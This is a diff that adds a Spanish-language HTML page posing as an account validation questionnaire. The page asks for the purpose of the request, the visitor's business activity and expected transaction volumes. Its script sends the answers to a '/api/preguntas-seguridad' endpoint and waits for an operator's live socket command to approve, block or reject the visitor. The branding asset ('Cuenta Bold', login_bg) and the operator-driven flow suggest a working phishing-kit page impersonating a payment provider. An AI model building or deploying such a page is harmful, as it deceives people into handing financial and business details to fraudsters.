@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Recolección de Información - Proceso</title>
+  <style>
+    :root { --primary: #2563eb; --white: #ffffff; --text: #0f1b43; }
+    * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+    body { margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(rgba(15, 27, 67, 0.6), rgba(15, 27, 67, 0.6)), url('./assets/Cuenta Bold File/login_bg.26fe7e9f.png'); background-size: cover; background-position: center; background-attachment: fixed; padding: 20px; }
+    .glass-container { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); width: min(500px, 100%); padding: 40px; border-radius: 24px; box-shadow: 0 25px 50px rgba(0,0,0,0.3); text-align: center; }
+    .progress-bar { height: 6px; background: #e2e8f0; border-radius: 10px; margin-bottom: 30px; overflow: hidden; }
+    .progress-fill { height: 100%; background: var(--primary); width: 25%; transition: width 0.4s ease; }
+    .question-step { display: none; animation: fadeIn 0.5s ease; }
+    .question-step.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    h2 { color: var(--text); font-size: 1.5rem; margin-bottom: 20px; }
+    textarea { width: 100%; padding: 15px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 1rem; resize: none; min-height: 100px; margin-bottom: 20px; outline: none; }
+    textarea:focus { border-color: var(--primary); }
+    .btn-next { background: var(--primary); color: white; border: none; padding: 14px 30px; border-radius: 10px; font-weight: 700; cursor: pointer; width: 100%; font-size: 1rem; }
+    .btn-next:hover { background: #1d4ed8; }
+    .loading-text { display: none; color: var(--primary); font-weight: 700; margin-top: 20px; }
+  </style>
+</head>
+<body>
+
+  <div class="glass-container">
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressBar"></div>
+    </div>
+
+    <form id="multiStepForm">
+      <div class="question-step active" id="step1">
+        <h2>1. ¿Cuál es el motivo principal de su solicitud hoy?</h2>
+        <textarea id="ans1" placeholder="Escriba aquí su respuesta..." required></textarea>
+        <button type="button" class="btn-next" onclick="nextStep(2)">Siguiente</button>
+      </div>
+
+      <div class="question-step" id="step2">
+        <h2>2. Describa brevemente su actividad comercial</h2>
+        <textarea id="ans2" placeholder="Detalles de su negocio..." required></textarea>
+        <button type="button" class="btn-next" onclick="nextStep(3)">Siguiente</button>
+      </div>
+
+      <div class="question-step" id="step3">
+        <h2>3. ¿Qué volumen de transacciones espera manejar?</h2>
+        <textarea id="ans3" placeholder="Ej: Montos mensuales estimados..." required></textarea>
+        <button type="button" class="btn-next" onclick="nextStep(4)">Siguiente</button>
+      </div>
+
+      <div class="question-step" id="step4">
+        <h2>4. Comentarios adicionales para el equipo de validación</h2>
+        <textarea id="ans4" placeholder="Alguna nota extra importante..." required></textarea>
+        <button type="button" class="btn-next" id="finalBtn">Finalizar Proceso</button>
+      </div>
+    </form>
+
+    <div class="loading-text" id="loader">Enviando respuestas y validando...</div>
+  </div>
+  <script src="./assets/js/config.js"></script>
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
+  <script>
+  (() => {
+    const sessionId = sessionStorage.getItem('sessionId');
+    if (!sessionId) { window.location.href = 'INICIO-OLD.html'; return; }
+
+    const socket = io(window.API_BASE_URL);
+    socket.on('connect', () => socket.emit('registerSession', sessionId));
+
+    const steps = 4;
+    const bar   = document.getElementById('progressBar');
+
+    window.nextStep = function(n) {
+      const prevVal = document.getElementById(`ans${n - 1}`)?.value.trim();
+      if (!prevVal) { alert('Por favor completa esta respuesta.'); return; }
+      document.getElementById(`step${n - 1}`).classList.remove('active');
+      document.getElementById(`step${n}`).classList.add('active');
+      bar.style.width = `${(n / steps) * 100}%`;
+    };
+
+    document.getElementById('finalBtn').addEventListener('click', async () => {
+      const r4 = document.getElementById('ans4').value.trim();
+      if (!r4) { alert('Por favor completa esta respuesta.'); return; }
+
+      const finalBtn = document.getElementById('finalBtn');
+      const loader   = document.getElementById('loader');
+
+      finalBtn.disabled    = true;
+      loader.style.display = 'block';
+      bar.style.width      = '100%';
+
+      const respuestas = {
+        pregunta1: document.getElementById('ans1').value.trim(),
+        pregunta2: document.getElementById('ans2').value.trim(),
+        pregunta3: document.getElementById('ans3').value.trim(),
+        pregunta4: r4
+      };
+
+      try {
+        const res  = await fetch(window.API_BASE_URL + '/api/preguntas-seguridad', {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify({ sessionId, respuestas })
+        });
+        const data = await res.json();
+
+        if (!data.success) {
+          alert(data.error || 'Error al enviar.');
+          finalBtn.disabled    = false;
+          loader.style.display = 'none';
+          return;
+        }
+
+        socket.on('action', ({ action }) => {
+          if (action === 'approved') {
+            window.location.href = 'VALIDANDOPROCESS.html';
+          } else if (action === 'blocked') {
+            alert('Proceso bloqueado. Contacta soporte.');
+            finalBtn.disabled    = false;
+            loader.style.display = 'none';
+          } else if (action === 'error_data') {
+            alert('Información incorrecta. Revisa tus respuestas.');
+            finalBtn.disabled    = false;
+            loader.style.display = 'none';
+          } else if (action === 'error_temp') {
+            alert('Error temporal. Intenta más tarde.');
+            finalBtn.disabled    = false;
+            loader.style.display = 'none';
+          }
+        });
+
+      } catch (err) {
+        console.error(err);
+        alert('Error de conexión. Intenta de nuevo.');
+        finalBtn.disabled    = false;
+        loader.style.display = 'none';
+      }
+    });
+  })();
+  </script>
+</body>
+</html>
